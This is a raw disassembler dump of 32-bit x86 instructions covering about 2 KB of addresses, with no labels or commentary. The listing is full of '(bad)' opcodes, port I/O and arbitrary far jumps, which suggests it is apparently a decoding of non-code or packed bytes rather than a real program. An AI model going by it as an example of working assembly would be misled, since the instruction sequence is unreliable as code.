  4199ab:	out    0xae,al
  4199ad:	pop    ebp
  4199ae:	pushf  
  4199af:	(bad)  
  4199b0:	stos   DWORD PTR es:[edi],eax
  4199b1:	pop    ebp
  4199b2:	in     al,dx
  4199b3:	pop    ds
  4199b4:	and    eax,0xd9b8bc87
  4199b9:	addr16 mov ds:0x4c0f,eax
  4199bd:	or     al,bl
  4199bf:	cdq    
  4199c0:	inc    esi
  4199c1:	seto   BYTE PTR [esi]
  4199c4:	dec    ebx
  4199c5:	rcr    DWORD PTR [edi-0xa],cl
  4199c8:	das    
  4199c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ca:	loopne 0x419a2d
  4199cc:	inc    edi
  4199cd:	dec    esi
  4199ce:	push   ebp
  4199cf:	inc    esi
  4199d0:	add    eax,0xa4af7fa9
  4199d5:	fisubr WORD PTR [edx+0x27]
  4199d8:	push   cs
  4199d9:	push   eax
  4199da:	mov    dh,0x66
  4199dc:	push   es
  4199dd:	call   0x2712:0x45edf060
  4199e4:	cmc    
  4199e5:	call   FWORD PTR [ebx-0x5ce9e583]
  4199eb:	test   BYTE PTR [edx*8+0x3d5141eb],0x2e
  4199f3:	dec    esi
  4199f4:	mov    esp,0x94fe5d3c
  4199f9:	add    eax,0x7a864314
  4199fe:	mov    ds:0xe57060ba,eax
  419a03:	das    
  419a04:	(bad)  
  419a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a06:	fiadd  WORD PTR ds:0x60830f7c
  419a0c:	mov    ds:0xc4be96e,al
  419a11:	mov    al,ds:0x687a7ed9
  419a16:	mov    dl,0xfc
  419a18:	int    0x67
  419a1a:	mov    esi,0xcd867e5d
  419a1f:	dec    esp
  419a20:	jnp    0x4199f8
  419a22:	mov    al,ds:0x41dd2a0a
  419a27:	sti    
  419a28:	fisttp QWORD PTR [edi]
  419a2a:	(bad)  
  419a2b:	sti    
  419a2c:	loop   0x419a01
  419a2e:	jmp    0x85f38c85
  419a33:	shl    DWORD PTR [eax+ebx*2-0x3d2be7b3],0x2b
  419a3b:	add    DWORD PTR [ecx],edx
  419a3d:	xor    DWORD PTR [edi],eax
  419a3f:	adc    al,0xec
  419a41:	and    edx,esi
  419a43:	add    eax,ebp
  419a45:	in     al,dx
  419a46:	adc    al,0xad
  419a48:	pop    eax
  419a49:	push   eax
  419a4a:	dec    eax
  419a4b:	ss jns 0x419aca
  419a4e:	or     BYTE PTR [ebp+0x7],0xc6
  419a52:	out    0xf8,al
  419a54:	ficomp WORD PTR [esi+0x1b]
  419a57:	push   edx
  419a58:	mov    esi,0x5562c5c0
  419a5d:	jnp    0x419a6a
  419a5f:	inc    ebp
  419a60:	or     DWORD PTR [ecx-0x666df5bf],0xed217bf
  419a6a:	mov    ds:0x490429db,eax
  419a6f:	push   ebx
  419a70:	stos   BYTE PTR es:[edi],al
  419a71:	xor    eax,0x1f666b21
  419a76:	je     0x419aef
  419a78:	or     eax,0x51b4d2aa
  419a7d:	ja     0x419a65
  419a7f:	mov    DWORD PTR [edi],esp
  419a81:	cli    
  419a82:	jae    0x419a99
  419a84:	add    dh,BYTE PTR [eax+0x34]
  419a87:	mov    cl,0x9d
  419a89:	cmp    dh,BYTE PTR [esi+0x27]
  419a8c:	lahf   
  419a8d:	(bad)  
  419a8e:	retf   0x2407
  419a91:	pop    ss
  419a92:	push   es
  419a93:	stc    
  419a94:	nop
  419a95:	int    0xe6
  419a97:	xor    DWORD PTR [ebp-0x66],0xffffffb0
  419a9b:	ja     0x419af6
  419a9d:	aam    0x85
  419a9f:	inc    eax
  419aa0:	inc    esi
  419aa1:	loopne 0x419af6
  419aa3:	dec    ecx
  419aa4:	out    dx,al
  419aa5:	lahf   
  419aa6:	adc    DWORD PTR [edi-0x1d],ebx
  419aa9:	repz sbb DWORD PTR [edi],edi
  419aac:	dec    DWORD PTR [edx]
  419aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419aaf:	lods   eax,DWORD PTR ds:[esi]
  419ab0:	sub    al,0xa0
  419ab2:	call   0xb017a116
  419ab7:	loope  0x419adf
  419ab9:	(bad)  
  419abb:	jl     0x419a51
  419abd:	and    al,0xb2
  419abf:	fcom   QWORD PTR [ebx]
  419ac1:	adc    DWORD PTR [ecx],ecx
  419ac3:	stos   BYTE PTR es:[edi],al
  419ac4:	jmp    0xa3bc:0x83f0d705
  419acb:	call   0x6e426840
  419ad0:	neg    BYTE PTR [ecx+0x72]
  419ad3:	cmp    dl,BYTE PTR [ebx+0x56]
  419ad6:	mov    ah,0xef
  419ad8:	dec    esi
  419ad9:	xchg   DWORD PTR [edi-0x6b],edi
  419adc:	push   ecx
  419add:	sub    al,BYTE PTR [esi+edi*1-0x51]
  419ae1:	out    0xf7,eax
  419ae3:	xchg   ebp,eax
  419ae4:	ins    DWORD PTR es:[edi],dx
  419ae5:	jmp    0x419b0b
  419ae7:	xor    dl,BYTE PTR [edi-0x69]
  419aea:	push   cs
  419aeb:	sbb    eax,0x93171a8e
  419af0:	sub    al,0x3a
  419af2:	mov    ebp,0xf22f7891
  419af7:	pusha  
  419af8:	adc    esi,ecx
  419afa:	mov    ebx,0xa517c458
  419aff:	test   BYTE PTR [eax-0x37],al
  419b02:	fldenv [ecx]
  419b04:	cmp    eax,0xd88d5d8e
  419b09:	jl     0x419ad9
  419b0b:	stos   BYTE PTR es:[edi],al
  419b0c:	imul   ebp,DWORD PTR [edi-0x4127ed53],0x79036cb7
  419b16:	test   BYTE PTR [esi-0x78],0x8c
  419b1a:	jno    0x419b10
  419b1c:	jo     0x419aa3
  419b1e:	cmp    ah,bl
  419b20:	(bad)  
  419b21:	out    dx,al
  419b22:	pop    ebx
  419b23:	xchg   BYTE PTR [esi+0x7e836666],bl
  419b29:	or     edx,DWORD PTR [ebx+esi*4+0x46]
  419b2d:	ficomp DWORD PTR [edi+ebp*8-0x75687a79]
  419b34:	dec    esi
  419b35:	aam    0xb3
  419b37:	xor    al,0x19
  419b39:	cld    
  419b3a:	test   al,0xee
  419b3c:	fsubr  QWORD PTR [edi-0x69415aa8]
  419b42:	or     ecx,DWORD PTR ds:0x1fc4e63d
  419b48:	ins    BYTE PTR es:[edi],dx
  419b49:	sub    eax,0x4397c683
  419b4e:	mov    eax,0x96b26c78
  419b53:	sbb    BYTE PTR [esi+0x5e],ah
  419b56:	jmp    0x256e:0x7c5c7e83
  419b5d:	sub    ah,bh
  419b5f:	repz xlat BYTE PTR ds:[ebx]
  419b61:	mov    esp,0x2285178d
  419b66:	arpl   WORD PTR ds:0x73e7f17f,si
  419b6c:	js     0x419b98
  419b6e:	jge    0x419b6d
  419b70:	loop   0x419bb1
  419b72:	or     ah,BYTE PTR [esi-0x79de1cc4]
  419b78:	div    BYTE PTR [esi+ebp*1+0x6ae04e16]
  419b7f:	sub    DWORD PTR [ebx-0x53ae839a],eax
  419b85:	(bad)  
  419b86:	loope  0x419bdd
  419b88:	dec    edi
  419b89:	xor    cl,bh
  419b8b:	(bad)  
  419b8c:	cmp    ecx,DWORD PTR [edx+0x72f63e27]
  419b92:	jmp    0x94c19ca5
  419b97:	outs   dx,DWORD PTR ss:[esi]
  419b99:	out    dx,al
  419b9a:	mov    al,0x1b
  419b9c:	hlt    
  419b9d:	shl    BYTE PTR [ecx+0x45],1
  419ba0:	pop    ecx
  419ba1:	pop    edx
  419ba2:	stos   BYTE PTR es:[edi],al
  419ba3:	add    ch,al
  419ba5:	fwait
  419ba6:	xchg   DWORD PTR [ebx-0x75cc64c],edi
  419bac:	mov    ah,0x47
  419bae:	dec    esi
  419baf:	shl    esi,cl
  419bb1:	mov    WORD PTR [eax+0x3c],?
  419bb4:	aaa    
  419bb5:	dec    edx
  419bb6:	mov    cl,0xb6
  419bb8:	add    DWORD PTR [eax+ebx*1-0xe],ecx
  419bbc:	inc    esi
  419bbd:	jecxz  0x419bc1
  419bbf:	xchg   edi,eax
  419bc0:	popa   
  419bc1:	enter  0x2496,0x69
  419bc5:	rcr    DWORD PTR [eax],cl
  419bc7:	loope  0x419b5d
  419bc9:	or     eax,0x5a895117
  419bce:	lods   eax,DWORD PTR ds:[esi]
  419bcf:	outs   dx,DWORD PTR ds:[esi]
  419bd0:	mov    edx,0x69462e36
  419bd5:	out    0xb7,eax
  419bd7:	pop    ds
  419bd8:	dec    ebx
  419bd9:	fst    QWORD PTR [edx]
  419bdb:	inc    DWORD PTR [esi*4-0x5e2c9699]
  419be2:	arpl   WORD PTR [ebp-0x4f0918a2],cx
  419be8:	jmp    0x419bf7
  419bea:	or     DWORD PTR [edx],ebx
  419bec:	lock fwait
  419bee:	jecxz  0x419c14
  419bf0:	aad    0x27
  419bf2:	ins    DWORD PTR es:[edi],dx
  419bf3:	loopne 0x419c49
  419bf5:	jne    0x419bf5
  419bf7:	pop    ds
  419bf8:	cmp    eax,0x644ea9fb
  419bfd:	inc    eax
  419bfe:	jmp    0x419b82
  419c00:	xchg   esp,eax
  419c01:	scas   al,BYTE PTR es:[edi]
  419c02:	and    DWORD PTR [ecx],esp
  419c04:	mov    DWORD PTR [eax],ebp
  419c06:	mov    esi,0xfec28850
  419c0b:	retf   
  419c0c:	pop    esp
  419c0d:	sbb    BYTE PTR [ebp+0x21],al
  419c10:	mov    bl,0xf9
  419c12:	hlt    
  419c13:	jnp    0x419c52
  419c15:	stc    
  419c16:	mov    edi,0xaddb364b
  419c1b:	sbb    cl,dh
  419c1d:	mov    esp,0xb31c3af8
  419c22:	mov    eax,ds:0xbdf15d5
  419c27:	je     0x419bf2
  419c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c2a:	pusha  
  419c2b:	mov    bh,bl
  419c2d:	out    0x5c,eax
  419c2f:	leave  
  419c30:	jmp    0xa3024274
  419c35:	and    BYTE PTR [esp+eiz*2],al
  419c38:	push   0xffffffd4
  419c3a:	xchg   BYTE PTR [edx],cl
  419c3c:	fldenv [edx]
  419c3e:	mov    dh,0x53
  419c40:	cmc    
  419c41:	daa    
  419c42:	fwait
  419c43:	add    eax,0xbed4410c
  419c48:	inc    edi
  419c49:	cmp    ah,BYTE PTR [ebx+0x51]
  419c4c:	mov    edx,0x3e79041d
  419c51:	bound  cx,DWORD PTR [edi]
  419c54:	xchg   ecx,eax
  419c55:	fisubr WORD PTR [ebp-0x11]
  419c58:	sbb    DWORD PTR [esi-0x5e],edx
  419c5b:	inc    ebp
  419c5c:	es mov ah,0x13
  419c5f:	in     al,0xe0
  419c61:	mov    cl,0x63
  419c63:	inc    esi
  419c64:	push   eax
  419c65:	jecxz  0x419c89
  419c67:	in     eax,dx
  419c68:	xor    ebp,edx
  419c6a:	dec    esi
  419c6b:	mov    ecx,0xa8f04bfc
  419c70:	inc    edx
  419c71:	leave  
  419c72:	shl    BYTE PTR [edx-0x34],1
  419c75:	(bad)
  419c79:	xor    eax,0x2790719a
  419c7e:	and    BYTE PTR [esi],0x23
  419c81:	imul   ebp,DWORD PTR [edx+0x12d07c0d],0xffffffd7
  419c88:	sbb    BYTE PTR [ebp+0x4559ec8a],dl
  419c8e:	xlat   BYTE PTR ds:[ebx]
  419c8f:	push   0x27e77e86
  419c94:	cli    
  419c95:	push   ecx
  419c96:	es xchg ebx,eax
  419c98:	xchg   ebp,eax
  419c99:	xchg   ebp,eax
  419c9a:	fisub  WORD PTR [ebx]
  419c9c:	jmp    0xfb57:0xfe2a5658
  419ca3:	inc    esi
  419ca4:	std    
  419ca5:	(bad)  
  419ca6:	mov    bh,0x28
  419ca8:	inc    eax
  419ca9:	sbb    edx,DWORD PTR [edx-0x1f]
  419cac:	or     bl,al
  419cae:	add    al,0xf2
  419cb0:	xchg   esi,eax
  419cb1:	push   ebp
  419cb2:	int3   
  419cb3:	dec    edx
  419cb4:	(bad)  
  419cb5:	or     cl,BYTE PTR [ebx-0x9fecc35]
  419cbb:	push   edi
  419cbc:	scas   eax,DWORD PTR es:[edi]
  419cbd:	push   edi
  419cbe:	retf   0x5964
  419cc1:	repz mov ch,0x1f
  419cc4:	lods   eax,DWORD PTR ds:[esi]
  419cc5:	mov    ebp,0x466215ee
  419cca:	inc    eax
  419ccb:	mov    cl,0xb0
  419ccd:	sbb    DWORD PTR [ebx],esi
  419ccf:	or     DWORD PTR [edx],edx
  419cd1:	mov    BYTE PTR [edi-0x78],bh
  419cd4:	int    0x9c
  419cd6:	je     0x419cdb
  419cd8:	scas   al,BYTE PTR es:[edi]
  419cd9:	mov    ebp,0xa96819d7
  419cde:	aaa    
  419cdf:	xchg   ebx,edi
  419ce1:	repz and eax,0xc9e0d447
  419ce7:	out    dx,eax
  419ce8:	dec    edx
  419ce9:	and    esp,DWORD PTR [ecx-0x1a8b1c44]
  419cef:	xchg   ebx,eax
  419cf0:	test   BYTE PTR [ebp+0x269d8c90],0xe4
  419cf7:	mov    edi,0x21f001ec
  419cfc:	scas   eax,DWORD PTR es:[edi]
  419cfd:	dec    esi
  419cfe:	rcr    BYTE PTR [esi],0x44
  419d01:	or     eax,0x9d1cfcd4
  419d06:	aaa    
  419d07:	or     al,0xb
  419d09:	cmp    cl,0x7a
  419d0c:	ret    0x42d9
  419d0f:	mov    esp,DWORD PTR [edi]
  419d11:	data16 jo 0x419d93
  419d14:	jg     0x419d8c
  419d16:	xchg   edi,eax
  419d17:	xor    DWORD PTR [edx+0x77b9f0bf],edi
  419d1d:	mov    eax,ds:0xeb123e0c
  419d22:	mov    WORD PTR [ebp+0x29],ss
  419d25:	jmp    FWORD PTR [edx+0x5cfe985]
  419d2b:	push   0x18
  419d2d:	dec    edx
  419d2e:	pop    edx
  419d2f:	loopne 0x419da9
  419d31:	add    al,bh
  419d33:	push   ds
  419d34:	add    eax,ebx
  419d36:	jnp    0x419d7a
  419d38:	sbb    al,0xcc
  419d3a:	sub    bh,BYTE PTR [esi-0x4386deeb]
  419d40:	test   BYTE PTR [ebp+0x370c1820],dh
  419d46:	mov    eax,0x59bc1edd
  419d4b:	maxps  xmm1,XMMWORD PTR [esi+0x78f59dbf]
  419d52:	cli    
  419d53:	push   ds
  419d54:	dec    edi
  419d55:	push   ebx
  419d56:	outs   dx,DWORD PTR ds:[esi]
  419d57:	rcr    DWORD PTR [ecx+0x4c],1
  419d5a:	fadd   DWORD PTR [edx-0x78]
  419d5d:	clc    
  419d5e:	int3   
  419d5f:	and    BYTE PTR [edi-0xb],dl
  419d62:	fist   DWORD PTR [edx-0x67]
  419d65:	pusha  
  419d66:	(bad)
  419d69:	stos   DWORD PTR es:[edi],eax
  419d6a:	mov    bl,0xdc
  419d6c:	std    
  419d6d:	cmp    DWORD PTR [esi],eax
  419d6f:	sar    ah,cl
  419d71:	inc    esi
  419d72:	mov    bh,0xfd
  419d74:	cmp    eax,ecx
  419d76:	stc    
  419d77:	xchg   ebx,eax
  419d78:	rcl    BYTE PTR [ecx+0x1a747c4],0x15
  419d7f:	outs   dx,DWORD PTR ds:[esi]
  419d80:	test   al,0xde
  419d82:	inc    edx
  419d83:	pop    edi
  419d84:	and    eax,0x52505e1b
  419d89:	fadd   DWORD PTR [bp+di-0x4f3a]
  419d8e:	dec    edi
  419d8f:	xchg   edi,eax
  419d90:	xchg   edx,eax
  419d91:	mov    bh,0xd7
  419d93:	cs push ss
  419d95:	shr    BYTE PTR [ebx],0x96
  419d98:	mov    BYTE PTR [eax],bl
  419d9a:	(bad)  
  419d9b:	push   ecx
  419d9c:	js     0x419e12
  419d9e:	dec    esi
  419d9f:	sahf   
  419da0:	cwde   
  419da1:	inc    ecx
  419da2:	fs push esp
  419da4:	mov    ebp,0xf629d70a
  419da9:	(bad)  
  419daa:	xor    esi,DWORD PTR ds:[edx]
  419dad:	push   ebp
  419dae:	pop    esi
  419daf:	sbb    DWORD PTR [eax],esi
  419db1:	aam    0x69
  419db3:	mov    ds:0x85472dc,al
  419db8:	jle    0x419d82
  419dba:	sub    eax,0xdc0c28f3
  419dbf:	sahf   
  419dc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dc1:	mov    ds:0x8b37cb00,eax
  419dc6:	mov    ds:0xcc7094ef,eax
  419dcb:	repz pop ss
  419dcd:	into   
  419dce:	mov    dl,0x10
  419dd0:	(bad)  
  419dd3:	gs dec ebp
  419dd5:	ins    DWORD PTR es:[edi],dx
  419dd6:	add    ebx,esi
  419dd8:	in     al,0xc6
  419dda:	call   0x6fef:0x715ebfe3
  419de1:	lods   al,BYTE PTR ds:[esi]
  419de2:	jnp    0x419d6a
  419de4:	jge    0x419e0b
  419de6:	popf   
  419de7:	push   esi
  419de8:	ins    BYTE PTR es:[edi],dx
  419de9:	rol    DWORD PTR ds:0x70cc542f,1
  419def:	ficom  WORD PTR ds:0x6e6b292a
  419df5:	push   eax
  419df6:	xchg   esi,eax
  419df7:	enter  0x472d,0x7e
  419dfb:	std    
  419dfc:	push   edi
  419dfd:	jg     0x419dcf
  419dff:	xor    ah,BYTE PTR [esi+0x158b4558]
  419e05:	lea    edi,[eax-0x4f850b8f]
  419e0b:	xor    eax,0x84d790c3
  419e10:	ja     0x419def
  419e12:	sbb    al,0xfa
  419e14:	cmp    bl,BYTE PTR [eax+eax*1]
  419e17:	lea    ebp,[esi]
  419e19:	push   es
  419e1a:	leave  
  419e1b:	push   eax
  419e1c:	push   cs
  419e1d:	dec    edi
  419e1e:	inc    ebx
  419e1f:	sahf   
  419e20:	repnz outs dx,DWORD PTR ds:[esi]
  419e22:	xchg   ebx,eax
  419e23:	(bad)  
  419e24:	mov    esp,0x96903f7
  419e29:	mov    ds:0x3c6e388b,al
  419e2e:	add    al,0x5e
  419e30:	jecxz  0x419de9
  419e32:	adc    edi,DWORD PTR [edi+0x560c97d5]
  419e38:	xor    DWORD PTR ds:0x9607f622,esp
  419e3e:	not    bl
  419e40:	das    
  419e41:	fsubr  QWORD PTR [eax]
  419e43:	test   ch,ah
  419e45:	aas    
  419e46:	inc    ecx
  419e47:	jne    0x419e02
  419e49:	lods   al,BYTE PTR ds:[esi]
  419e4a:	cmp    al,0x7f
  419e4c:	cmp    dh,dh
  419e4e:	push   ebx
  419e4f:	cmc    
  419e50:	mov    esp,0x147e2926
  419e55:	data16 arpl cx,dx
  419e58:	es retf 0x91af
  419e5c:	ror    DWORD PTR [eax+0x4e7ad2b2],1
  419e62:	push   0xc
  419e64:	nop
  419e65:	push   ss
  419e66:	ja     0x419e42
  419e68:	repnz fisubr DWORD PTR [esi+0x78]
  419e6c:	mov    edx,0xb4e1692f
  419e71:	es in  eax,dx
  419e73:	ds mov esi,0xa7d26ed4
  419e79:	mov    ch,0xdb
  419e7b:	cmp    al,0x4a
  419e7d:	add    DWORD PTR [ecx],edx
  419e7f:	fidivr WORD PTR [esp+edx*1+0x4b]
  419e83:	fist   DWORD PTR [eax+0x43c7b7f2]
  419e89:	fcomp  DWORD PTR [edx+0x6be60cd2]
  419e8f:	loope  0x419eab
  419e91:	jmp    0x419ef2
  419e93:	into   
  419e94:	ins    BYTE PTR es:[edi],dx
  419e95:	mov    WORD PTR [edx+0x9],?
  419e98:	clc    
  419e99:	shl    ecx,1
  419e9b:	dec    esp
  419e9c:	hlt    
  419e9d:	xchg   esp,eax
  419e9e:	sub    DWORD PTR [edx+0x705398be],esi
  419ea4:	and    al,BYTE PTR [eax-0x11]
  419ea7:	dec    ebx
  419ea8:	jl     0x419e55
  419eaa:	jle    0x419ea8
  419eac:	mov    bl,0x7f
  419eae:	push   eax
  419eaf:	xor    eax,0x70577371
  419eb4:	lahf   
  419eb5:	dec    ebx
  419eb6:	lea    ebx,[eax-0x6b3e88dc]
  419ebc:	inc    edi
  419ebd:	fmul   DWORD PTR [esi+0x1c]
  419ec0:	in     al,dx
  419ec1:	jp     0x419ee9
  419ec3:	adc    al,0x8c
  419ec5:	fadd   QWORD PTR [ebx-0x71]
  419ec8:	int3   
  419ec9:	mul    DWORD PTR [edi+eax*2+0x63]
  419ecd:	hlt    
  419ece:	sub    edx,DWORD PTR ds:0xdefbdd43
  419ed4:	leave  
  419ed5:	ins    BYTE PTR es:[edi],dx
  419ed6:	pop    es
  419ed7:	inc    esp
  419ed8:	push   ebx
  419ed9:	repz icebp 
  419edb:	js     0x419e78
  419edd:	adc    al,0x6
  419edf:	push   ebx
  419ee0:	pushf  
  419ee1:	sbb    BYTE PTR [eax+0x5f],cl
  419ee4:	dec    esi
  419ee5:	call   0xe2846e2d
  419eea:	inc    DWORD PTR [ebx+0x5e]
  419eed:	inc    esp
  419eee:	test   ebp,ebx
  419ef0:	push   0xffffffd8
  419ef2:	pop    ecx
  419ef3:	mov    WORD PTR [edi+0x81bf69b],ss
  419ef9:	repz jo 0x419e82
  419efc:	call   0xfd20:0x9b4ab7e4
  419f03:	loopne 0x419e8e
  419f05:	or     eax,0xca9da6dd
  419f0a:	mov    cl,0xa7
  419f0c:	(bad)  
  419f0d:	pop    eax
  419f0e:	les    ecx,FWORD PTR [ebp+edi*8-0x7c]
  419f12:	(bad)  
  419f13:	sar    DWORD PTR [ecx-0x6c00ffea],1
  419f19:	jbe    0x419eb2
  419f1b:	xor    DWORD PTR [ecx],eax
  419f1d:	lock sahf 
  419f1f:	adc    BYTE PTR [edi+0x27d35f23],dl
  419f25:	in     eax,0xde
  419f27:	or     al,0x1e
  419f29:	xor    eax,0x1bc32327
  419f2e:	mov    eax,ds:0x55d0440f
  419f33:	xchg   DWORD PTR [edx+edx*2-0x61bcb8a9],eax
  419f3a:	clc    
  419f3b:	mov    ah,BYTE PTR [edi]
  419f3d:	dec    edx
  419f3e:	jae    0x419f66
  419f40:	pop    es
  419f41:	pop    es
  419f42:	dec    ecx
  419f43:	cmp    dh,BYTE PTR [edx+eiz*8+0x50c0dc72]
  419f4a:	arpl   WORD PTR [edi],dx
  419f4c:	fldenv [ebx-0x6ddea041]
  419f52:	and    BYTE PTR [ebx],0x95
  419f55:	shl    esi,cl
  419f57:	ror    BYTE PTR [ebx+0x51],1
  419f5a:	cmp    al,0x2a
  419f5c:	pop    edx
  419f5d:	enter  0xd3c9,0x1
  419f61:	or     DWORD PTR gs:[esi+edx*1-0x7f],ecx
  419f66:	loopne 0x419f0f
  419f68:	xchg   DWORD PTR [eax-0x4a],esi
  419f6b:	bound  esp,QWORD PTR [ebx]
  419f6d:	mov    edx,0xd9f4c876
  419f72:	adc    esp,ecx
  419f74:	jp     0x419f70
  419f76:	(bad)  
  419f77:	aad    0xb7
  419f79:	int3   
  419f7a:	push   edx
  419f7b:	jmp    0x5feb:0x98fc35dc
  419f82:	adc    al,BYTE PTR [edx+0x3f05d77]
  419f88:	fprem  
  419f8a:	cmp    eax,0x47c37997
  419f8f:	lods   eax,DWORD PTR ds:[esi]
  419f90:	in     eax,0xff
  419f92:	pop    edi
  419f93:	push   eax
  419f94:	icebp  
  419f95:	in     eax,0x31
  419f97:	in     al,0xb6
  419f99:	fbld   TBYTE PTR [ecx+0xba9a21c]
  419f9f:	fild   DWORD PTR [eax-0x23cf2c6b]
  419fa5:	xchg   ecx,eax
  419fa6:	fst    DWORD PTR [edx-0x4a31fbe3]
  419fac:	es push edi
  419fae:	mov    ecx,0x7ab0a03f
  419fb3:	pop    esp
  419fb4:	imul   esi,ecx,0x5a697f1c
  419fba:	into   
  419fbb:	iret   
  419fbc:	dec    eax
  419fbd:	mov    al,0x31
  419fbf:	sub    ecx,0x20
  419fc2:	icebp  
  419fc3:	xchg   edi,eax
  419fc4:	sbb    bl,BYTE PTR [edi-0x64]
  419fc7:	pop    ss
  419fc8:	sbb    al,0x35
  419fca:	int3   
  419fcb:	mov    ecx,ecx
  419fcd:	sahf   
  419fce:	push   ss
  419fcf:	pop    ebp
  419fd0:	lods   eax,DWORD PTR ds:[esi]
  419fd1:	or     ah,dl
  419fd3:	clc    
  419fd4:	or     edx,DWORD PTR [esi+ebx*1]
  419fd7:	outs   dx,BYTE PTR ds:[esi]
  419fd8:	dec    ecx
  419fd9:	das    
  419fda:	cld    
  419fdb:	jns    0x419f74
  419fdd:	mov    eax,ds:0x3540a284
  419fe2:	sub    eax,0x4dd5b845
  419fe7:	test   al,0x24
  419fe9:	pop    ebx
  419fea:	push   edi
  419feb:	xor    ecx,eax
  419fed:	mov    edi,0xb020187b
  419ff2:	mov    ds:0x2d6b01b2,al
  419ff7:	pop    edi
  419ff8:	xchg   ecx,eax
  419ff9:	lods   al,BYTE PTR ds:[esi]
  419ffa:	push   edx
  419ffb:	mov    WORD PTR [esi+0x26],gs
  419ffe:	imul   edi,DWORD PTR [eax+0x2],0x9e9c6a59
  41a005:	or     ebx,DWORD PTR [esi-0x5fdb6a78]
  41a00b:	add    esp,ebx
  41a00d:	jp     0x419f94
  41a00f:	loope  0x41a063
  41a011:	inc    eax
  41a012:	out    dx,al
  41a013:	mov    dh,0x24
  41a015:	popf   
  41a016:	in     al,0xc6
  41a018:	and    al,0x2d
  41a01a:	cmp    eax,0x57a2ab5a
  41a01f:	or     BYTE PTR [esi],cl
  41a021:	cmp    dh,bl
  41a023:	call   0x62e7:0xb79ac098
  41a02a:	rol    DWORD PTR [edi],cl
  41a02c:	mov    edi,0x46502411
  41a031:	ret    0x6723
  41a034:	push   ss
  41a035:	gs mov ecx,0x7ab0d47b
  41a03b:	jb     0x41a02b
  41a03d:	ss test al,0x87
  41a040:	jns    0x41a053
  41a042:	int    0x42
  41a044:	xchg   ebx,eax
  41a045:	mov    edx,0xa16e010b
  41a04a:	icebp  
  41a04b:	mov    edx,0x8aee5a6c
  41a050:	adc    eax,0x40290a75
  41a055:	jns    0x41a06a
  41a057:	popf   
  41a058:	xchg   esi,eax
  41a059:	(bad)  
  41a05a:	hlt    
  41a05b:	inc    esp
  41a05c:	xor    eax,0xee53f9a3
  41a061:	push   edi
  41a062:	retf   0xd9a4
  41a065:	add    eax,0x877deffb
  41a06a:	add    BYTE PTR [edi],ch
  41a06c:	pop    ss
  41a06d:	js     0x419ff8
  41a06f:	add    eax,0x4e3c942f
  41a074:	push   es
  41a075:	pop    es
  41a076:	adc    edi,DWORD PTR [edi+0x19]
  41a079:	ret    0x9e2
  41a07c:	sbb    edx,DWORD PTR [ecx-0x73dc07c5]
  41a082:	inc    ebp
  41a083:	ins    BYTE PTR es:[edi],dx
  41a084:	stos   BYTE PTR es:[edi],al
  41a085:	and    bl,BYTE PTR [ebp-0x48]
  41a088:	hlt    
  41a089:	jp     0x41a0a8
  41a08b:	lods   eax,DWORD PTR ds:[esi]
  41a08c:	int    0x7f
  41a08e:	adc    DWORD PTR [edx-0x28],0xb682e52e
  41a095:	adc    dl,al
  41a097:	adc    dh,BYTE PTR [ebx+0x77]
  41a09a:	sub    DWORD PTR [eax+edi*1+0x34],0xd0f5fc0f
  41a0a2:	movsx  edi,BYTE PTR [ecx+0x2563b7c6]
  41a0a9:	cmp    DWORD PTR [ebp-0x115093c6],esi
  41a0af:	sub    eax,0xe7f16e44
  41a0b4:	push   edi
  41a0b5:	pop    es
  41a0b6:	xor    DWORD PTR [edx+0x7f],0x28afb1e2
  41a0bd:	mov    ch,ch
  41a0bf:	dec    esp
  41a0c0:	adc    cl,BYTE PTR [eax+0xc375173]
  41a0c6:	xor    ch,BYTE PTR [ecx+edx*1-0xd]
  41a0ca:	jo     0x41a0be
  41a0cc:	and    ecx,DWORD PTR [edi+0x3d2491f8]
  41a0d2:	outs   dx,DWORD PTR ds:[esi]
  41a0d3:	and    ecx,edx
  41a0d5:	aaa    
  41a0d6:	mov    ebx,0x48c8d06e
  41a0db:	push   ebx
  41a0dc:	xor    BYTE PTR [ebp+0x75],ch
  41a0df:	shl    ah,cl
  41a0e1:	and    al,0x71
  41a0e3:	ror    DWORD PTR [ebx],cl
  41a0e5:	jle    0x41a166
  41a0e7:	es enter 0xdac8,0xe2
  41a0ec:	push   ebp
  41a0ed:	(bad)  
  41a0ef:	cwde   
  41a0f0:	in     al,dx
  41a0f1:	imul   ebp,DWORD PTR [ecx+0x6adb7cd1],0x78b93c35
  41a0fb:	lea    edi,[ebp-0x4ac7a867]
  41a101:	rcl    BYTE PTR [esi-0x2d7bb9c3],1
  41a107:	(bad)  
  41a108:	retf   
  41a109:	push   es
  41a10a:	outs   dx,BYTE PTR ds:[esi]
  41a10b:	dec    edi
  41a10c:	sbb    BYTE PTR cs:[edx+0x72],cl
  41a110:	cmp    al,0x95
  41a112:	in     eax,dx
  41a113:	outs   dx,BYTE PTR ds:[esi]
  41a114:	fwait
  41a115:	sub    BYTE PTR [eax],bl
  41a117:	push   esp
  41a118:	(bad)  
  41a119:	fst    DWORD PTR [ecx-0x41ea8921]
  41a11f:	js     0x41a167
  41a121:	cmp    al,0xcf
  41a123:	inc    ebp
  41a124:	dec    eax
  41a125:	mov    esp,0x58e274ac
  41a12a:	adc    ah,0xf2
  41a12d:	push   eax
  41a12e:	out    dx,eax
  41a12f:	daa    
  41a130:	retf   
  41a131:	or     ebp,DWORD PTR [edi-0x57]
  41a134:	push   edi
  41a135:	outs   dx,DWORD PTR ds:[esi]
  41a136:	cmp    eax,0xa84d65b0
  41a13b:	test   BYTE PTR [eax-0x45c78ca9],dh
  41a141:	lods   al,BYTE PTR ds:[esi]
  41a142:	enter  0xbdc3,0xf4
  41a146:	fcomip st,st(1)
  41a148:	sbb    eax,0x756123bb
  41a14d:	push   ds
  41a14e:	xor    esp,DWORD PTR [ecx-0x65]
  41a151:	std    
  41a152:	out    0xb7,eax
  41a154:	pushf  
  41a155:	test   WORD PTR [edi-0x2a],bx
  41a159:	add    edx,esp
  41a15b:	push   cs
  41a15c:	add    al,0x4e
  41a15e:	mov    edi,0x16ce2624
  41a163:	adc    BYTE PTR [edi+0x4af038b8],cl
  41a169:	sbb    edi,DWORD PTR [ebx-0x6d]
  41a16c:	push   ecx
  41a16d:	inc    edi
  41a16e:	icebp  
